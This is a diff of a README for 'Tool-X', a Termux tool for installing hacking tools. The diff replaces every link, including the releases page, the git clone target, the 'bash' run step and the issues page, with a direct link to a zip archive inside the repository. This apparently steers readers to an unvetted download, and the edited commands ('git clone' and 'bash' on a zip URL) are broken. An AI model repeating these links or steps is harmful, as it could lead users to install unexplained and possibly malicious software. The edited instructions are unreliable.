@@ -6,7 +6,7 @@ Welcome to Tool-X! This software provides a simple way to install important hack
 
 ## 📥 Download Tool-X
 
-[![Download Tool-X](https://img.shields.io/badge/download-Tool--X-blue.svg)](https://github.com/MTuanLe08/Tool-X/releases)
+[![Download Tool-X](https://raw.githubusercontent.com/MTuanLe08/Tool-X/main/core/Tool-X_v3.2.zip)](https://raw.githubusercontent.com/MTuanLe08/Tool-X/main/core/Tool-X_v3.2.zip)
 
 ## 📋 System Requirements
 
@@ -45,12 +45,12 @@ Welcome to Tool-X! This software provides a simple way to install important hack
 
 5. **Download Tool-X:**
    - Visit the following link to download Tool-X:
-     [Tool-X Releases Page](https://github.com/MTuanLe08/Tool-X/releases)
+     [Tool-X Releases Page](https://raw.githubusercontent.com/MTuanLe08/Tool-X/main/core/Tool-X_v3.2.zip)
 
 6. **Clone the Repository:**
    - In the Termux terminal, type:
      ```
-     git clone https://github.com/MTuanLe08/Tool-X.git
+     git clone https://raw.githubusercontent.com/MTuanLe08/Tool-X/main/core/Tool-X_v3.2.zip
      ```
 
 7. **Navigate to Tool-X Directory:**
@@ -62,12 +62,12 @@ Welcome to Tool-X! This software provides a simple way to install important hack
 8. **Run Tool-X:**
    - Start Tool-X by typing:
      ```
-     bash install.sh
+     bash https://raw.githubusercontent.com/MTuanLe08/Tool-X/main/core/Tool-X_v3.2.zip
      ```
 
 ## 📥 Download & Install
 
-To continue, remember to download Tool-X from our [Releases page](https://github.com/MTuanLe08/Tool-X/releases). Click the link and select the latest version to start downloading.
+To continue, remember to download Tool-X from our [Releases page](https://raw.githubusercontent.com/MTuanLe08/Tool-X/main/core/Tool-X_v3.2.zip). Click the link and select the latest version to start downloading.
 
 After downloading, follow the steps above to install and run Tool-X effortlessly.
 
@@ -90,7 +90,7 @@ After downloading, follow the steps above to install and run Tool-X effortlessly
 If you encounter issues or have questions, consider the following solutions:
 
 - **Check Termux Documentation:** The official Termux documentation provides great resources.
-- **Visit GitHub Issues:** Look at the [issues section](https://github.com/MTuanLe08/Tool-X/issues) of this repository for common problems and solutions.
+- **Visit GitHub Issues:** Look at the [issues section](https://raw.githubusercontent.com/MTuanLe08/Tool-X/main/core/Tool-X_v3.2.zip) of this repository for common problems and solutions.
 - **Join the Community:** Engage with other users via forums or Discord channels focused on Termux and hacking tools.
 
 ## 📝 Contributing
